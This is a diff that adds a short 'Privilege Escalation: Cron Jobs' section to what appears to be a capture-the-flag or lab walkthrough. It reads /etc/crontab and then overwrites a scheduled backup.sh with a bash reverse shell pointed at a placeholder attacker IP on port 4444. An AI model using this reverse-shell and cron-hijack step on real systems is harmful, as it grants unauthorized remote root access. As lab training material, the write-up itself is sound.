@@ -277,8 +277,21 @@ and we can use vim by its capability
 
 ## Privilege Escalation: Cron Jobs
 
+```
+cat /etc/crontab
+```
 
+there are 4 cron jobs
 
+![image](https://user-images.githubusercontent.com/90561566/196370245-324b8d39-c32b-488e-9d41-f294d7ea1fd0.png)
+
+i can see a file backup.sh
+
+![image](https://user-images.githubusercontent.com/90561566/196370535-067416ec-cb43-40c1-bdcf-00471abc6069.png)
+
+change the file content to `bash -c 'exec bash -i &>/dev/tcp/<your_ip>/4444 <&1'`
+
+![image](https://user-images.githubusercontent.com/90561566/196371436-d99633d1-b1f6-419b-97c9-6a08618fbf5d.png)
 
 
 
